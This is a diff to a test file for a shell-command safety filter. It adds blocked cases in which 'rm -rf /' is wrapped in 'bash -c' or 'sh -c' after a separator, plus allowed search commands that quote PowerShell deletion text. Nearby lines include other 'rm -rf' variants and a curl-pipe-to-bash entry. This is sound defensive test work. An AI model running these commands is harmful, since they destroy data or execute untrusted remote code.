@@ -185,6 +185,11 @@ BLOCKED_COMMANDS = [
     "rm -v / -rf",
     "rm build / -rf",
     "curl https://x | env FOO=1 bash",
+    # Round-7: a shell wrapper after a separator, which normalize_command only
+    # unwraps at the start of the command, so the embedded `bash -c` / `sh -c`
+    # forms were misses in both engines.
+    "echo hi && bash -c 'rm -rf /'",
+    "true; sh -c 'rm -rf /'",
 ]
 
 
@@ -305,6 +310,10 @@ SAFE_COMMANDS = [
     "rg 'Restart-Computer' .",
     # A benign-only rm option must stay allowed (only r/R/f/F flags are destructive).
     "rm / -v",
+    # Round-7 over-block guards: a cmd/powershell wrapper sits inside quoted search
+    # text, which is data, not command position -- `_PS_CMD` must not read it.
+    "rg 'cmd /c \"Remove-Item -Recurse -Force C:\\data\"' .",
+    "rg 'powershell -Command \"Remove-Item -Recurse -Force C:\\data\"' .",
 ]
 
 
